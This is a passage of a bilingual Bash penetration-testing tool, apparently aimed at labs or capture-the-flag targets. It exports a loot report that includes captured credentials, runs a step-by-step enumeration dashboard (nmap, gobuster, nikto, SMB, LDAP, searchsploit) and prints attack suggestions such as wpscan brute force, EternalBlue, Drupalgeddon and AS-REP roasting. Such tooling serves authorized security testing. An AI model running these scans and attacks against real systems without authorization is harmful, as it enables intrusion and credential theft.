        if [[ -f "$LOOT_DIR/smb/enum4linux.txt" ]]; then
            echo -e "\n  ${C_INFO}-- enum4linux highlights --${C_R}"
            grep -iE "share|user|group|password|domain" "$LOOT_DIR/smb/enum4linux.txt" 2>/dev/null | head -20 | sed 's/^/    /'
        fi
        if [[ ! -f "$LOOT_DIR/smb/smbmap.txt" && ! -f "$LOOT_DIR/smb/enum4linux.txt" ]]; then
            echo -e "  ${C_DIM}No SMB results found${C_R}"
        fi
        echo ""

        # -- 8. CREDENTIALS --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  8. 🔑 CREDENTIALS / CREDENCIALES ENCONTRADAS                ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        local found_creds=false
        for cf in "$LOOT_DIR"/creds/*.txt; do
            [[ -f "$cf" ]] || continue
            [[ ! -s "$cf" ]] && continue
            found_creds=true
            local cf_name="$(basename "$cf")"
            local cf_lines=$(wc -l < "$cf")
            echo -e "  ${C_OK}-- $cf_name ($cf_lines lines) --${C_R}"
            cat "$cf" | head -20 | sed 's/^/    /'
            echo ""
        done
        if ! $found_creds; then
            echo -e "  ${C_DIM}No credential files found${C_R}"
        fi
        echo ""

        # -- 9. DNS / ZONE TRANSFER --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  9. 🌍 DNS / ZONE TRANSFER                                   ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        if [[ -f "$LOOT_DIR/dns/zone_transfer.txt" ]]; then
            cat "$LOOT_DIR/dns/zone_transfer.txt" | head -40 | sed 's/^/    /'
        elif [[ -f "$LOOT_DIR/dns/dns_nmap.txt" ]]; then
            cat "$LOOT_DIR/dns/dns_nmap.txt" | head -20 | sed 's/^/    /'
        else
            echo -e "  ${C_DIM}No DNS results found${C_R}"
        fi
        echo ""

        # -- 10. SNMP --
        if [[ -f "$LOOT_DIR/scans/snmpwalk.txt" || -f "$LOOT_DIR/scans/snmpcheck.txt" ]]; then
            echo -e "${C_SEC}+--------------------------------------------------------------+"
            echo -e "║  10. 📡 SNMP DATA                                            ║"
            echo -e "+--------------------------------------------------------------+${C_R}"
            if [[ -f "$LOOT_DIR/scans/snmp_communities.txt" ]]; then
                echo -e "  ${C_INFO}Community strings:${C_R}"
                cat "$LOOT_DIR/scans/snmp_communities.txt" | head -10 | sed 's/^/    /'
            fi
            if [[ -f "$LOOT_DIR/scans/snmp_software.txt" ]]; then
                echo -e "  ${C_INFO}Software:${C_R}"
                cat "$LOOT_DIR/scans/snmp_software.txt" | head -15 | sed 's/^/    /'
            fi
            echo ""
        fi

        # -- 11. MAIL --
        if ls "$LOOT_DIR"/mail/*.txt &>/dev/null; then
            echo -e "${C_SEC}+--------------------------------------------------------------+"
            echo -e "║  11. 📧 MAIL (IMAP/POP3/SMTP)                                ║"
            echo -e "+--------------------------------------------------------------+${C_R}"
            for mf in "$LOOT_DIR"/mail/*.txt; do
                echo -e "  ${C_INFO}-- $(basename "$mf") --${C_R}"
                cat "$mf" | head -15 | sed 's/^/    /'
                echo ""
            done
        fi

        # -- 12. ALL PARSED FINDINGS --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  12. ⭐ ALL PARSED FINDINGS / TODOS LOS HALLAZGOS            ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        if [[ ${#FINDINGS[@]} -gt 0 ]]; then
            local idx=1
            for f in "${FINDINGS[@]}"; do
                local clean
                clean=$(echo "$f" | sed 's/\x1B\[[0-9;]*[a-zA-Z]//g')
                echo -e "  ${C_OK}[$idx]${C_R} $clean"
                ((idx++))
            done
        else
            echo -e "  ${C_DIM}No findings parsed yet${C_R}"
        fi
        echo ""

        # -- 13. FILE INDEX --
        echo -e "${C_SEC}+--------------------------------------------------------------+"
        echo -e "║  13. 📂 ALL GENERATED FILES / ARCHIVOS GENERADOS             ║"
        echo -e "+--------------------------------------------------------------+${C_R}"
        find "$LOOT_DIR" \( -name "*.txt" -o -name "*.nmap" -o -name "*.xml" -o -name "*.yaml" -o -name "*.md" \) \
            2>/dev/null | sort | while IFS= read -r f; do
            local sz; sz=$(du -sh "$f" 2>/dev/null | cut -f1)
            echo -e "    ${C_DIM}$f${C_R} [${C_INFO}$sz${C_R}]"
        done
        echo ""

        echo -e "${C_TITLE}${SEP}"
        echo -e "   END OF REPORT — View with: less -R $report"
        echo -e "${SEP}${C_R}"

    } > "$report"

    echo ""
    log_ok "${LGREEN}Report exported successfully to / Reporte exportado exitosamente a:${NC}"
    echo -e "  👉 ${WHITE}$report${NC}"
    echo ""
    log_info "View with colors / Visualiza con colores: ${YELLOW}less -R $report${NC}"
    log_info "Or directly / O directamente:             ${YELLOW}cat $report${NC}"
    echo ""; read -rp "  Press ENTER to continue..."
}

# =============================================================================
# -- SMART ENUM DASHBOARD -----------------------------------------------------
# =============================================================================
smart_enum() {
    require_ip || return
    require_loot || return

    # -- Step state tracker --
    declare -A _se_state  # LOCKED | READY | DONE
    declare -A _se_result # result summary per step

    _se_state[1]="READY"
    for i in 2 3 4 5 6 7 8 9; do _se_state[$i]="LOCKED"; done

    # Reload ports from previous scans if available
    [[ -f "$LOOT_DIR/scans/open_ports.txt" ]] && PORTS=$(cat "$LOOT_DIR/scans/open_ports.txt" | tr -d '\r')
    [[ -f "$LOOT_DIR/scans/open_ports_udp.txt" ]] && PORTS_UDP=$(cat "$LOOT_DIR/scans/open_ports_udp.txt" | tr -d '\r')

    # If ports already known, auto-unlock step 2+
    if [[ -n "$PORTS" ]]; then
        _se_state[1]="DONE"
        _se_result[1]="$(echo "$PORTS" | tr ',' '\n' | wc -l) puertos TCP abiertos"
        _se_state[2]="READY"
        # Check if deep scan already exists
        if [[ -f "$LOOT_DIR/scans/targeted.nmap" ]] && [[ -s "$LOOT_DIR/scans/targeted.nmap" ]]; then
            _se_state[2]="DONE"
            _se_result[2]="Versiones detectadas en $LOOT_DIR/scans/targeted.nmap"
            # Unlock service steps based on ports
            _se_state[7]="READY"  # VulnScan always
            has_any_port 80 443 8080 8443 8000 8888 && _se_state[3]="READY"
            has_port 22 && _se_state[4]="READY"
            has_any_port 139 445 && _se_state[5]="READY"
            has_any_port 389 636 88 && _se_state[6]="READY"
        fi
        # Check existing results
        [[ -s "$LOOT_DIR/web/gobuster.txt" ]] || [[ -s "$LOOT_DIR/web/gobuster_port80.txt" ]] && _se_state[3]="DONE" && _se_result[3]="Web escaneado"
        [[ -s "$LOOT_DIR/scans/ssh_auth_methods.txt" ]] && _se_state[4]="DONE" && _se_result[4]="SSH escaneado"
        [[ -s "$LOOT_DIR/smb/enum4linux.txt" ]] && _se_state[5]="DONE" && _se_result[5]="SMB escaneado"
        [[ -s "$LOOT_DIR/scans/vulns.txt" ]] && _se_state[7]="DONE" && _se_result[7]="VulnScan completado"
        [[ -s "$LOOT_DIR/exploit/searchsploit_auto.txt" ]] && _se_state[8]="DONE" && _se_result[8]="Searchsploit completado"
    fi

    # Helper: count completed enum steps (3-7)
    _se_enum_done() {
        local c=0
        for s in 3 4 5 6 7; do [[ "${_se_state[$s]}" == "DONE" ]] && ((c++)); done
        echo "$c"
    }

    # Helper: unlock searchsploit if enough data
    _se_check_unlock_search() {
        local ed=$(_se_enum_done)
        if (( ed >= 2 )) && [[ "${_se_state[8]}" == "LOCKED" ]]; then
            _se_state[8]="READY"
        fi
        if [[ "${_se_state[8]}" == "DONE" ]] && [[ "${_se_state[9]}" == "LOCKED" ]]; then
            _se_state[9]="READY"
        fi
    }
    _se_check_unlock_search

    # Helper: inline result report
    _se_show_result() {
        local step_num="$1" title="$2"
        shift 2
        echo ""
        echo -e "  ${LGREEN}+- RESULTADOS: $title --------------------------------------+${NC}"
        for line in "$@"; do
            echo -e "  ${LGREEN}│${NC}  $line"
        done
        echo -e "  ${LGREEN}+--------------------------------------------------------------+${NC}"
        echo ""
    }

    # -----------------------------------------------------------------------
    # -- MAIN LOOP --
    # -----------------------------------------------------------------------
    while true; do
        _se_check_unlock_search
        banner
        log_section "🧭 SMART ENUM — Enumeración Guiada"
        echo ""
        local port_count=0
        [[ -n "$PORTS" ]] && port_count=$(echo "$PORTS" | tr ',' '\n' | wc -l)
        echo -e "  ${WHITE}Target:${NC} ${BOLD}$IP${NC}    ${WHITE}OS:${NC} ${OS_ICON:-?} ${OS_TARGET:-Unknown}    ${WHITE}Puertos:${NC} $port_count TCP"
        echo ""

        # -- Step list with states --
        local total_steps=0 done_steps=0 _step_icon _step_color _step_extra
        for s in 1 2 3 4 5 6 7 8 9; do
            local label="" visible=true
            case $s in
                1) label="Nmap TCP + UDP (escaneo de puertos)" ;;
                2) label="Deep Scan (versiones + scripts)" ;;
                3) label="Web Enum (Gobuster + Nikto + WhatWeb)"
                   [[ -n "$PORTS" ]] && ! has_any_port 80 443 8080 8443 8000 8888 && visible=false ;;
                4) label="SSH Enum (auth + audit)"
                   [[ -n "$PORTS" ]] && ! has_port 22 && visible=false ;;
                5) label="SMB Enum (enum4linux + smbclient)"
                   [[ -n "$PORTS" ]] && ! has_any_port 139 445 && visible=false ;;
                6) label="LDAP / Active Directory"
                   [[ -n "$PORTS" ]] && ! has_any_port 389 636 88 && visible=false ;;
                7) label="VulnScan (nmap vuln scripts)" ;;
                8) label="Searchsploit (buscar exploits)" ;;
                9) label="Resumen Final + Recomendaciones" ;;
            esac

            [[ "$visible" == false ]] && continue
            ((total_steps++))

            case "${_se_state[$s]}" in
                DONE)
                    _step_icon="✅"; _step_color="${LGREEN}"; ((done_steps++))
                    _step_extra="${_se_result[$s]:-completado}" ;;
                READY)
                    _step_icon="🔓"; _step_color="${CYAN}"
                    _step_extra="listo para ejecutar" ;;
                LOCKED)
                    _step_icon="🔒"; _step_color="${DIM}"
                    case $s in
                        2) _step_extra="necesita paso 1" ;;
                        3|4|5|6|7) _step_extra="necesita paso 2" ;;
                        8) _step_extra="necesita 2+ pasos de 3-7" ;;
                        9) _step_extra="necesita paso 8" ;;
                        *) _step_extra="bloqueado" ;;
                    esac ;;
            esac

            printf "  ${_step_color}[%d] %s %-42s${NC} ${DIM}— %s${NC}\n" \
                "$s" "$_step_icon" "$label" "$_step_extra"
        done

        echo ""
        # Progress bar
        local bar_w=25 filled=0
        [[ $total_steps -gt 0 ]] && filled=$(( (done_steps * bar_w) / total_steps ))
        local bar="${LGREEN}"
        for ((b=0; b<filled; b++)); do bar+="█"; done
        bar+="${DIM}"
        for ((b=filled; b<bar_w; b++)); do bar+="░"; done
        echo -e "  Progreso: ${bar}${NC}  ${WHITE}${done_steps}/${total_steps}${NC}"
        echo ""

        # Show last result if any
        if [[ -n "${_se_result[_last_step]:-}" ]]; then
            :  # results shown inline after execution
        fi

        echo -e "  ${WHITE}[#]${NC} Introduce número de paso   ${WHITE}[b]${NC} Volver"
        echo ""
        separator
        if ! read -rp "  $(echo -e "${CYAN}Paso:${NC} ")" choice; then
            echo ""
            log_warn "EOF detectado o entrada cerrada. Volviendo al menú principal."
            return
        fi

        case "$choice" in
            b|B) return ;;
            [1-9])
                if [[ "${_se_state[$choice]}" == "LOCKED" ]]; then
                    log_warn "Paso $choice bloqueado. Completa los pasos anteriores primero."
                    sleep 1.5
                    continue
                elif [[ "${_se_state[$choice]}" == "DONE" ]]; then
                    log_info "Paso $choice ya completado. ¿Volver a ejecutar? [s/N]"
                    read -rp "  " _redo
                    [[ ! "$_redo" =~ ^[sS]$ ]] && continue
                fi

                echo ""
                case $choice in
                    1)  # -- PORT SCAN --
                        log_section "PASO 1: Escaneo de Puertos"
                        log_run "nmap -p- --open -sS --min-rate 5000 -n -Pn $IP"
                        nmap -p- --open -sS --min-rate 5000 -n -Pn "$IP" -oN "$LOOT_DIR/scans/allports.txt" 2>&1
                        PORTS=$(grep -oP '^\d+/open' "$LOOT_DIR/scans/allports.txt" 2>/dev/null | cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
                        echo "$PORTS" > "$LOOT_DIR/scans/open_ports.txt"
                        # UDP top 100
                        log_run "nmap -sU --top-ports 100 --min-rate 1000 -Pn $IP"
                        nmap -sU --top-ports 100 --min-rate 1000 -Pn "$IP" -oN "$LOOT_DIR/scans/udp.txt" 2>&1
                        PORTS_UDP=$(grep -oP '^\d+/open' "$LOOT_DIR/scans/udp.txt" 2>/dev/null | cut -d/ -f1 | sort -n | tr '\n' ',' | sed 's/,$//')
                        [[ -n "$PORTS_UDP" ]] && echo "$PORTS_UDP" > "$LOOT_DIR/scans/open_ports_udp.txt"

                        local pc=$(echo "$PORTS" | tr ',' '\n' | wc -l)
                        _se_state[1]="DONE"
                        _se_result[1]="${pc} puertos TCP: $PORTS"
                        _se_state[2]="READY"
                        _se_show_result 1 "PORT SCAN" \
                            "TCP: ${YELLOW}$PORTS${NC}" \
                            "UDP: ${YELLOW}${PORTS_UDP:-ninguno}${NC}" \
                            "Total: ${WHITE}${pc} puertos abiertos${NC}"
                        ;;

                    2)  # -- DEEP SCAN --
                        log_section "PASO 2: Deep Scan (Versiones)"
                        log_run "nmap -p$PORTS -sC -sV -O -Pn $IP"
                        sudo nmap -p"$PORTS" -sC -sV -O -Pn "$IP" -oA "$LOOT_DIR/scans/targeted" 2>&1
                        # Parse versions
                        parse_service_versions "$LOOT_DIR/scans/targeted.nmap"
                        detect_os
                        _se_state[2]="DONE"
                        # Build version summary
                        local _ver_summary=""
                        if [[ -f "$LOOT_DIR/scans/targeted.nmap" ]]; then
                            _ver_summary=$(grep -oP '^\d+/tcp\s+open\s+\S+\s+.*' "$LOOT_DIR/scans/targeted.nmap" 2>/dev/null | head -8)
                        fi
                        _se_result[2]="Versiones extraídas"
                        # Unlock service steps based on discovered ports
                        _se_state[7]="READY"  # VulnScan always
                        has_any_port 80 443 8080 8443 8000 8888 && _se_state[3]="READY"
                        has_port 22 && _se_state[4]="READY"
                        has_any_port 139 445 && _se_state[5]="READY"
                        has_any_port 389 636 88 && _se_state[6]="READY"
                        # Show results
                        local -a _lines=()
                        while IFS= read -r l; do
                            [[ -n "$l" ]] && _lines+=("${YELLOW}$l${NC}")
                        done <<< "$_ver_summary"
                        _lines+=("OS: ${WHITE}${OS_TARGET:-Unknown}${NC}")
                        _se_show_result 2 "DEEP SCAN" "${_lines[@]}"
                        ;;

                    3)  # -- WEB ENUM --
                        log_section "PASO 3: Web Enumeration"
                        web_enum
                        # Wait for results if web_enum launched tmux
                        if tmux has-session -t "$TMUX_SESSION" 2>/dev/null; then
                            local _wc=0
                            log_info "Esperando resultados web (Gobuster + Nikto)..."
                            while (( _wc < 600 )); do
                                local _wins=$(tmux list-windows -t "$TMUX_SESSION" -F '#{window_name}' 2>/dev/null | grep -ciE 'WebEnum|Nikto|Nuclei')
                                [[ "$_wins" -eq 0 ]] && (( _wc > 30 )) && break
                                ((_wc++))
                                (( _wc % 20 == 0 )) && log_info "  ⏳ Esperando... (${_wc}s)"
                                sleep 1
                            done
                        fi
                        _se_state[3]="DONE"
                        # Count results
                        local _gb_count=0 _nk_count=0 _web_cves=0
                        for _gf in "$LOOT_DIR/web"/gobuster*.txt; do
                            [[ -f "$_gf" ]] && _gb_count=$(( _gb_count + $(grep -cP 'Status:\s*(200|301|302|403)' "$_gf" 2>/dev/null) ))
                        done
                        for _nf in "$LOOT_DIR/web"/nikto*.txt; do
                            [[ -f "$_nf" ]] && _nk_count=$(( _nk_count + $(grep -cP '^\+ ' "$_nf" 2>/dev/null) ))
                        done
                        _web_cves=$(grep -rcoP 'CVE-\d{4}-\d+' "$LOOT_DIR/web/" 2>/dev/null | awk -F: '{s+=$2}END{print s+0}')
                        _se_result[3]="${_gb_count} rutas, ${_nk_count} nikto, ${_web_cves} CVEs"
                        _se_show_result 3 "WEB ENUM" \
                            "Gobuster: ${YELLOW}${_gb_count} rutas encontradas${NC}" \
                            "Nikto: ${YELLOW}${_nk_count} hallazgos${NC}" \
                            "CVEs web: ${YELLOW}${_web_cves}${NC}"
                        # Parse findings
                        for logfile in "$LOOT_DIR/web"/*.txt; do
                            [[ -f "$logfile" ]] && parse_scan_findings "$logfile" "$(basename "$logfile" .txt)" 2>/dev/null
                        done
                        ;;

                    4)  # -- SSH ENUM --
                        log_section "PASO 4: SSH Enumeration"
                        ssh_enum
                        _se_state[4]="DONE"
                        local _ssh_info=""
                        grep -qi 'password' "$LOOT_DIR/scans/ssh_auth_methods.txt" 2>/dev/null && _ssh_info+="password ✅ "
                        grep -qi 'publickey' "$LOOT_DIR/scans/ssh_auth_methods.txt" 2>/dev/null && _ssh_info+="pubkey "
                        _se_result[4]="Auth: ${_ssh_info:-desconocido}"
                        _se_show_result 4 "SSH ENUM" \
                            "Auth methods: ${YELLOW}${_ssh_info:-no detectado}${NC}"
                        ;;

                    5)  # -- SMB ENUM --
                        log_section "PASO 5: SMB Enumeration"
                        smb_enum
                        _se_state[5]="DONE"
                        local _smb_info="escaneado"
                        if [[ -f "$LOOT_DIR/smb/enum4linux.txt" ]]; then
                            local _sh=$(grep -ciP 'share|disk' "$LOOT_DIR/smb/enum4linux.txt" 2>/dev/null)
                            local _us=$(grep -ciP 'username|user:' "$LOOT_DIR/smb/enum4linux.txt" 2>/dev/null)
                            _smb_info="${_sh:-0} shares, ${_us:-0} users"
                        fi
                        _se_result[5]="$_smb_info"
                        _se_show_result 5 "SMB ENUM" \
                            "${YELLOW}$_smb_info${NC}"
                        ;;

                    6)  # -- LDAP ENUM --
                        log_section "PASO 6: LDAP / Active Directory"
                        ldap_enum
                        _se_state[6]="DONE"
                        _se_result[6]="LDAP escaneado"
                        _se_show_result 6 "LDAP/AD" \
                            "${YELLOW}Enumeración completada${NC}"
                        ;;

                    7)  # -- VULNSCAN --
                        log_section "PASO 7: VulnScan"
                        log_run "nmap -p$PORTS -sV --script vuln -Pn $IP"
                        nmap -p"$PORTS" -sV --script vuln -Pn "$IP" -oN "$LOOT_DIR/scans/vulns.txt" 2>&1
                        _se_state[7]="DONE"
                        local _vc=$(grep -coP 'CVE-\d{4}-\d+' "$LOOT_DIR/scans/vulns.txt" 2>/dev/null)
                        _se_result[7]="${_vc:-0} CVEs encontrados"
                        parse_scan_findings "$LOOT_DIR/scans/vulns.txt" "VULNS" 2>/dev/null
                        _se_show_result 7 "VULNSCAN" \
                            "CVEs: ${YELLOW}${_vc:-0}${NC}" \
                            "Archivo: ${DIM}$LOOT_DIR/scans/vulns.txt${NC}"
                        ;;

                    8)  # -- SEARCHSPLOIT --
                        log_section "PASO 8: Searchsploit"
                        mkdir -p "$LOOT_DIR/exploit"
                        if [[ -f "$LOOT_DIR/scans/targeted.xml" ]] && command -v searchsploit &>/dev/null; then
                            log_run "searchsploit --nmap $LOOT_DIR/scans/targeted.xml"
                            searchsploit --nmap "$LOOT_DIR/scans/targeted.xml" 2>&1 | tee "$LOOT_DIR/exploit/searchsploit_auto.txt"
                            # Search by version strings
                            if [[ ${#SERVICES_VERSION[@]} -gt 0 ]]; then
                                for _sv in "${SERVICES_VERSION[@]}"; do
                                    local _svc_name=$(echo "$_sv" | awk '{print $2}')
                                    local _svc_ver=$(echo "$_sv" | awk '{$1=$2=""; print $0}' | xargs)
                                    if [[ -n "$_svc_ver" ]]; then
                                        log_info "Buscando exploits: ${WHITE}$_svc_name $_svc_ver${NC}"
                                        searchsploit "$_svc_name $_svc_ver" 2>&1 | tee -a "$LOOT_DIR/exploit/searchsploit_versions.txt"
                                    fi
                                done
                            fi
                            local _sp_count=$(grep -cP '^\|' "$LOOT_DIR/exploit/searchsploit_auto.txt" 2>/dev/null || echo 0)
                            _se_state[8]="DONE"
                            _se_result[8]="${_sp_count} exploits encontrados"
                            _se_state[9]="READY"
                            _se_show_result 8 "SEARCHSPLOIT" \
                                "Exploits: ${YELLOW}${_sp_count}${NC}" \
                                "Archivo: ${DIM}$LOOT_DIR/exploit/searchsploit_auto.txt${NC}"
                        else
                            log_warn "searchsploit no disponible o no hay targeted.xml"
                            _se_state[8]="DONE"
                            _se_result[8]="sin searchsploit"
                            _se_state[9]="READY"
                        fi
                        ;;

                    9)  # -- RESUMEN FINAL --
                        log_section "PASO 9: Resumen Final"
                        # Parse ALL findings
                        for _dir in scans smb web ldap db remote smtp dns mail ftp banners; do
                            [[ -d "$LOOT_DIR/$_dir" ]] || continue
                            for logfile in "$LOOT_DIR/$_dir"/*.txt "$LOOT_DIR/$_dir"/*.nmap; do
                                [[ -f "$logfile" ]] && parse_scan_findings "$logfile" "$(basename "$logfile" .txt)" 2>/dev/null
                            done
                        done
                        # Generate report
                        generate_loot_index 2>/dev/null
                        _se_state[9]="DONE"
                        _se_result[9]="Reporte generado"
                        # Show summary
                        local _fc=$(wc -l < "$LOOT_DIR/findings.txt" 2>/dev/null || echo 0)
                        echo ""
                        echo -e "  ${LGREEN}${BOLD}+--------------------------------------------------------------+${NC}"
                        echo -e "  ${LGREEN}${BOLD}║  ✅ ENUMERACIÓN COMPLETA                                    ║${NC}"
                        echo -e "  ${LGREEN}${BOLD}?--------------------------------------------------------------?${NC}"
                        echo -e "  ${LGREEN}${BOLD}║${NC}  Hallazgos totales: ${WHITE}${_fc}${NC}"
                        echo -e "  ${LGREEN}${BOLD}║${NC}  Resumen: ${WHITE}$LOOT_DIR/README.md${NC}"
                        echo -e "  ${LGREEN}${BOLD}║${NC}  Findings: ${WHITE}$LOOT_DIR/findings.txt${NC}"
                        echo -e "  ${LGREEN}${BOLD}+--------------------------------------------------------------+${NC}"
                        echo ""
                        show_recommendations
                        ;;
                esac

                read -rp "  Presiona ENTER para continuar..."
                ;;
            *)
                log_warn "Opción inválida."
                sleep 0.8
                ;;
        esac
    done
}

# Helper: standalone vuln scan for smart_enum
_smart_vuln_scan() {
    require_ip || return
    require_loot || return
    [[ -z "$PORTS" ]] && { log_warn "No ports scanned yet."; return; }
    # -sV is critical: without version detection many vuln scripts don't activate
    log_run "nmap -p$PORTS -sV --script vuln -Pn $IP"
    nmap -p"$PORTS" -sV --script vuln -Pn "$IP" -oN "$LOOT_DIR/scans/vulns.txt" 2>&1
}

# Helper: standalone DNS enum for smart_enum
_smart_dns_enum() {
    require_ip || return
    require_loot || return
    mkdir -p "$LOOT_DIR/dns"
    if [[ -n "$DOMAIN" ]]; then
        log_run "dig axfr $DOMAIN @$IP"
        dig axfr "$DOMAIN" @"$IP" 2>&1 | tee "$LOOT_DIR/dns/zone_transfer.txt"
    else
        log_run "nmap -p53 --script dns-nsid,dns-recursion -Pn $IP"
        nmap -p53 --script dns-nsid,dns-recursion -Pn "$IP" -oN "$LOOT_DIR/dns/dns_nmap.txt" 2>&1
    fi
}

# =============================================================================
# -- RECOMMENDATIONS ENGINE ----------------------------------------------------
# =============================================================================
show_recommendations() {
    [[ -z "$PORTS" ]] && return

    echo -e "  ${LPURPLE}${BOLD}+- 🧭  RECOMMENDED NEXT STEPS ----------------------------------------+${NC}"

    local has_recs=false

    # FTP recommendations
    if has_port 21; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}21 (FTP)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Probar ${YELLOW}login anonimo${NC}: opcion ${WHITE}[F] -> [1]${NC}"
        has_recs=true
    fi

    # SSH recommendations
    if has_port 22; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}22 (SSH)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Verificar ${YELLOW}version y auth methods${NC}: ${WHITE}[H] -> [1]${NC}"
        has_recs=true
    fi

    # Web recommendations
    if has_any_port 80 443 8080 8443 8000 8888; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}Web (HTTP/S)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Lanzar ${YELLOW}gobuster + nikto + whatweb${NC}: ${WHITE}[W]${NC}"
        
        # Reconocimientos dinámicos para CMS
        if [[ -n "$CMS_DETECTED" ]]; then
            echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} CMS Web: ${LRED}$CMS_DETECTED${NC}"
            case "$CMS_DETECTED" in
                "WordPress")
                    echo -e "  ${LPURPLE}|${NC}    Probar enumeracion: ${YELLOW}wpscan --url http://$IP -e u,vp,vt${NC}"
                    echo -e "  ${LPURPLE}|${NC}    Ataque fuerza bruta: ${YELLOW}wpscan --url http://$IP -U admin -P /usr/share/wordlists/rockyou.txt${NC}"
                    ;;
                "Joomla")
                    echo -e "  ${LPURPLE}|${NC}    Probar Joomscan: ${YELLOW}joomscan -u http://$IP${NC}"
                    echo -e "  ${LPURPLE}|${NC}    Escaneo droopescan: ${YELLOW}droopescan scan joomla -u http://$IP${NC}"
                    ;;
                "Drupal")
                    echo -e "  ${LPURPLE}|${NC}    Probar Droopescan: ${YELLOW}droopescan scan drupal -u http://$IP${NC}"
                    echo -e "  ${LPURPLE}|${NC}    Ataque Drupalgeddon: ${YELLOW}searchsploit drupalgeddon${NC}"
                    ;;
            esac
        fi
        
        has_recs=true
    fi

    # SMB recommendations
    if has_any_port 139 445; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}445/139 (SMB)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Probar ${YELLOW}null session + enum shares${NC}: ${WHITE}[S]${NC}"
        if [[ "$OS_TARGET" == "Windows" ]]; then
            echo -e "  ${LPURPLE}|${NC}    ${LRED}▶ Windows + SMB = Probar EternalBlue${NC}: ${WHITE}[S]->[7]${NC}"
        fi
        has_recs=true
    fi

    # LDAP / Kerberos recommendations (AD)
    if has_any_port 389 636 88; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}LDAP/Kerberos${NC} -> posible ${YELLOW}AD${NC}"
        echo -e "  ${LPURPLE}|${NC}    Probar ${YELLOW}enum anonimo + AS-REP Roast${NC}: ${WHITE}[L]${NC}"
        has_recs=true
    fi

    # Database recommendations
    if has_port 1433; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}1433 (MSSQL)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Probar ${YELLOW}sa con password vacio${NC}: ${WHITE}[D] -> [2]${NC}"
        has_recs=true
    fi
    if has_port 3306; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}3306 (MySQL)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Probar ${YELLOW}root sin password${NC}: ${WHITE}[D] -> [5]${NC}"
        has_recs=true
    fi
    if has_port 5432; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}5432 (PostgreSQL)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Probar ${YELLOW}brute-force + databases${NC}: ${WHITE}[D] -> [8]${NC}"
        has_recs=true
    fi

    # RDP recommendations (Windows)
    if has_port 3389; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}3389 (RDP)${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Si tienes creds: ${YELLOW}xfreerdp /u:USER /p:PASS /v:$IP${NC}"
        has_recs=true
    fi

    # WinRM recommendations
    if has_any_port 5985 5986; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}▶${NC} Puerto ${WHITE}WinRM${NC} abierto -> ${YELLOW}evil-winrm si tienes creds${NC}"
        has_recs=true
    fi

    # SNMP
    if [[ -n "$PORTS_UDP" ]] && echo ",$PORTS_UDP," | grep -q ",161,"; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}?${NC} Puerto ${WHITE}161/udp (SNMP)${NC} -> probar ${YELLOW}community strings${NC}"
        has_recs=true
    fi

    # NFS
    if has_port 2049; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}?${NC} Puerto ${WHITE}2049 (NFS)${NC} -> probar ${YELLOW}showmount -e $IP${NC}"
        has_recs=true
    fi

    # IMAP / POP3
    if has_any_port 143 110 993 995; then
        echo -e "  ${LPURPLE}|${NC}  ${GREEN}?${NC} Puerto ${WHITE}IMAP/POP3${NC} abierto"
        echo -e "  ${LPURPLE}|${NC}    Si tienes creds, leer buzones: ${WHITE}[I]${NC}"
        has_recs=true
    fi

    # OS-specific tips
    local pr=()
    if [[ "$OS_TARGET" == "Windows" ]]; then
        has_any_port 139 445 && pr+=("SMB")
        has_any_port 80 443 8080 8443 8000 8888 && pr+=("Web")
        has_any_port 389 636 88 && pr+=("AD")
        has_any_port 5985 5986 && pr+=("WinRM")
        has_port 3389 && pr+=("RDP")
        has_port 1433 && pr+=("MSSQL")
        if [[ ${#pr[@]} -gt 0 ]]; then
            echo -e "  ${LPURPLE}|${NC}"
            echo -e "  ${LPURPLE}|${NC}  ${LCYAN}OS: Windows${NC} | Vias de ataque: ${WHITE}$(IFS=' | '; echo "${pr[*]}")${NC}"
        fi
    elif [[ "$OS_TARGET" == "Linux" ]]; then
        has_any_port 80 443 8080 8443 8000 8888 && pr+=("Web")
        has_port 22 && pr+=("SSH")
        has_port 21 && pr+=("FTP")
        has_port 2049 && pr+=("NFS")
        [[ -n "$PORTS_UDP" ]] && echo ",$PORTS_UDP," | grep -q ",161," && pr+=("SNMP")
        if [[ ${#pr[@]} -gt 0 ]]; then
            echo -e "  ${LPURPLE}|${NC}"
            echo -e "  ${LPURPLE}|${NC}  ${LGREEN}OS: Linux${NC} | Vias de ataque: ${WHITE}$(IFS=' | '; echo "${pr[*]}")${NC}"
        fi
    fi

    if $has_recs; then
        echo -e "  ${LPURPLE}${BOLD}+--------------------------------------------------------------+${NC}"
    fi
    echo ""
}

# =============================================================================
# -- 10. IMAP/POP3 Enumeration ------------------------------------------------
# =============================================================================
imap_enum() {
    banner
